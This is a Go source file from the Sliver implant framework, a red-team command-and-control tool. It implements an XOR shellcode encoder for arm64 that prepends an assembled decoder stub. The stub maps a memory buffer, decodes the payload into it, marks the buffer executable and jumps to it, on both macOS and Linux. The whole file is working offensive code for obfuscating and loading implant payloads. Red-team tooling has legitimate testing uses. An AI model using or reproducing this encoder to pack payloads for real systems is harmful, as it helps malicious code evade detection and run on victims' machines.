package arm64

/*
	Sliver Implant Framework
	Copyright (C) 2026  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.

*/

import (
	"encoding/binary"
	"fmt"
	"strings"

	"github.com/moloch--/go-keystone"
)

const (
	xorKeySize   = 8
	xorBlockSize = 8
)

// Xor encodes an arm64 payload using a basic XOR scheme and a small aarch64
// decoder stub (prepended) which allocates a RW buffer, decodes into it,
// marks it RX, then jumps to the decoded payload. This avoids in-place writes
// (W^X-friendly loaders may map the initial shellcode RX).
func Xor(data []byte, key []byte) ([]byte, error) {
	if len(data) == 0 {
		return nil, fmt.Errorf("xor encoder: empty payload")
	}
	if len(key) != xorKeySize {
		return nil, fmt.Errorf("xor encoder: invalid key length %d", len(key))
	}

	blockCount := (len(data) + xorBlockSize - 1) / xorBlockSize
	if blockCount <= 0 {
		return nil, fmt.Errorf("xor encoder: invalid block count %d", blockCount)
	}

	paddedLen := blockCount * xorBlockSize
	encoded := make([]byte, paddedLen)
	copy(encoded, data)

	for i := 0; i < paddedLen; i += xorBlockSize {
		for j := 0; j < xorKeySize; j++ {
			encoded[i+j] ^= key[j]
		}
	}

	stub, err := buildDecoderStub(blockCount, key)
	if err != nil {
		return nil, err
	}
	return append(stub, encoded...), nil
}

func buildDecoderStub(blockCount int, key []byte) ([]byte, error) {
	if blockCount <= 0 {
		return nil, fmt.Errorf("xor encoder: invalid block count %d", blockCount)
	}
	if len(key) != xorKeySize {
		return nil, fmt.Errorf("xor encoder: invalid key length %d", len(key))
	}

	engine, err := keystone.NewEngine(keystone.ARCH_ARM64, keystone.MODE_LITTLE_ENDIAN)
	if err != nil {
		return nil, err
	}
	defer func() { _ = engine.Close() }()

	keyValue := binary.LittleEndian.Uint64(key)

	var sb strings.Builder
	sb.Grow(512)

	sb.WriteString("adr x19, payload\n") // x19 = encoded payload base
	emitMovImm64(&sb, "x20", uint64(blockCount))
	emitMovImm64(&sb, "x21", keyValue) // x21 = xor key

	// macOS runner maps the shellcode RX, so decoding in place will fault.
	// Instead, allocate a RW buffer, decode into it, mprotect to RX, then jump.
	sb.WriteString("mov x22, x20\n")
	sb.WriteString("lsl x22, x22, #3\n") // x22 = payload len in bytes

	// mmap(NULL, payloadLen, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0)
	sb.WriteString("mov x0, #0\n")
	sb.WriteString("mov x1, x22\n")
	sb.WriteString("mov x2, #3\n")      // PROT_READ|PROT_WRITE
	sb.WriteString("mov x3, #0x1002\n") // MAP_PRIVATE|MAP_ANON (darwin)
	sb.WriteString("mov x4, #-1\n")
	sb.WriteString("mov x5, #0\n")
	sb.WriteString("mov x8, #222\n") // Linux: __NR_mmap
	emitMovImm64(&sb, "x16", 0x020000C5)
	sb.WriteString("svc #0\n")
	// Darwin MAP_ANON is 0x1000, Linux MAP_ANONYMOUS is 0x20.
	// Try Darwin flags first, then retry with Linux flags if the syscall fails.
	sb.WriteString("tbnz x0, #63, mmap_linux\n")
	sb.WriteString("b mmap_ok\n")
	sb.WriteString("mmap_linux:\n")
	sb.WriteString("mov x0, #0\n")
	sb.WriteString("mov x1, x22\n")
	sb.WriteString("mov x2, #3\n")    // PROT_READ|PROT_WRITE
	sb.WriteString("mov x3, #0x22\n") // MAP_PRIVATE|MAP_ANONYMOUS (linux)
	sb.WriteString("mov x4, #-1\n")
	sb.WriteString("mov x5, #0\n")
	sb.WriteString("mov x8, #222\n") // Linux: __NR_mmap
	emitMovImm64(&sb, "x16", 0x020000C5)
	sb.WriteString("svc #0\n")
	sb.WriteString("mmap_ok:\n")
	sb.WriteString("mov x23, x0\n") // x23 = dest base

	// Decode/copy loop: src=x19, dst=x0, blocks=x1
	sb.WriteString("mov x0, x23\n")
	sb.WriteString("mov x1, x20\n")
	sb.WriteString("mov x2, x19\n")
	sb.WriteString("decode:\n")
	sb.WriteString("ldr x3, [x2], #8\n")
	sb.WriteString("eor x3, x3, x21\n")
	sb.WriteString("str x3, [x0], #8\n")
	sb.WriteString("subs x1, x1, #1\n")
	sb.WriteString("b.ne decode\n")

	// mprotect(dst, payloadLen, PROT_READ|PROT_EXEC)
	sb.WriteString("mov x0, x23\n")
	sb.WriteString("mov x1, x22\n")
	sb.WriteString("mov x2, #5\n")   // PROT_READ|PROT_EXEC
	sb.WriteString("mov x8, #226\n") // Linux: __NR_mprotect
	emitMovImm64(&sb, "x16", 0x0200004A)
	sb.WriteString("svc #0\n")

	sb.WriteString("br x23\n")
	sb.WriteString("payload:\n")

	inst, err := engine.Assemble(sb.String(), 0)
	if err != nil {
		return nil, err
	}
	if len(inst) == 0 || len(inst)%4 != 0 {
		return nil, fmt.Errorf("xor encoder: unexpected decoder stub length %d", len(inst))
	}
	return inst, nil
}

func emitMovImm64(sb *strings.Builder, reg string, imm uint64) {
	lo := uint16(imm & 0xffff)
	m16 := uint16((imm >> 16) & 0xffff)
	m32 := uint16((imm >> 32) & 0xffff)
	m48 := uint16((imm >> 48) & 0xffff)

	// Explicit movz/movk keeps the stub stable across assemblers.
	fmt.Fprintf(sb, "movz %s, #0x%X\n", reg, lo)
	fmt.Fprintf(sb, "movk %s, #0x%X, lsl #16\n", reg, m16)
	fmt.Fprintf(sb, "movk %s, #0x%X, lsl #32\n", reg, m32)
	fmt.Fprintf(sb, "movk %s, #0x%X, lsl #48\n", reg, m48)
}
